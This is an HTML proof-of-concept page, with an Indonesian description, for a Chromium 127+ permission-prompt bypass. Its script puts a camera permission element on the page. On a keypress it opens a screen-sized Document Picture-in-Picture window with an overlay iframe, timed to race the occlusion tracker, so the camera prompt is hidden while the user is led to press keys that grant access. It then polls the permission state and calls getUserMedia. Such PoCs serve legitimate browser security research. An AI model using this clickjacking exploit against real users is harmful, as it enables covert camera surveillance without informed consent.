<!doctype html>
<html>
<head>
<style>
html { font-family: sans-serif; }
#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }

#wrapper {
    position: absolute;
    bottom: 0;
    right: 0px;
    z-index: 9999; /* Attempt higher layering for creative overlay */
}
#permElem {
    width: fit-content;
    height: 1px;
    font-size: 11px;
    outline: none;
    background: #fff;
    color: #888;
    position: absolute; /* Dynamic positioning for potential bypass */
    bottom: 10px; /* Adjust based on flag for dialog positioning */
}
</style>
</head>
<body>
<h1>PoC Updated: PEPC Prompt Obscured by Document PiP (Post-Fix Variant)</h1>
<p>Varian ini mencoba race condition timing untuk simulasi di versi Chromium 127+. Occlusion tracker sekarang diinisialisasi, sehingga prompt dinonaktifkan jika occluded.</p>
<p id="instructions">Press tab, then enter (simulating user interaction)</p>
<div id="wrapper">
    <permission id="permElem" type="camera"></permission>
</div>
<script>
var newWin;
var pipOpened = false;

// Creative addition: Delay prompt interaction to race against tracker init
permElem.addEventListener('keydown', async (e) => {
    if (e.keyCode === 9) return; // Ignore tab
    if (pipOpened) return;

    // Hypothetical race: Open PiP with delay to overlap init
    setTimeout(async () => {
        try {
            newWin = await documentPictureInPicture.requestWindow({
                width: window.screen.width * 2, // Larger for full coverage
                height: window.screen.height * 2,
                disallowReturnToOpener: true
            });
            newWin.document.body.innerHTML = '<style>html { font-family: sans-serif; }</style><h1>Press tab twice, then enter (obscuring layer)</h1>';
            pipOpened = true;
            console.log('PiP opened; checking for occlusion bypass');
            
            // Creative variant: Attempt secondary overlay (e.g., iframe) for multi-layer
            const overlayIframe = newWin.document.createElement('iframe');
            overlayIframe.src = 'about:blank'; // Neutral content
            overlayIframe.style = 'position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000;';
            newWin.document.body.appendChild(overlayIframe);
        } catch (err) {
            console.error('PiP request failed:', err);
        }
    }, 100); // Adjustable delay for race condition testing
});

// Periodic check with added logging for research
setInterval(async () => {
    try {
        const permStatus = await navigator.permissions.query({name: 'camera'});
        if (permStatus.state === 'granted') {
            instructions.innerText = 'Permission granted (research simulation)';
            permElem.remove();
            if (newWin) newWin.close();
            navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
                console.log('Camera access simulated');
            }).catch(err => console.error('Media access error:', err));
        } else if (permStatus.state === 'prompt') {
            console.log('Prompt active; occlusion may be detected in fixed versions');
        }
    } catch (err) {
        console.error('Permission query error:', err);
    }
}, 500);

// Creative monitoring: Observe resize or focus changes for adaptive positioning
const resizeObserver = new ResizeObserver(() => {
    console.log('Window resized; potential for repositioning bypass');
});
resizeObserver.observe(document.body);
</script>
</body>
</html>
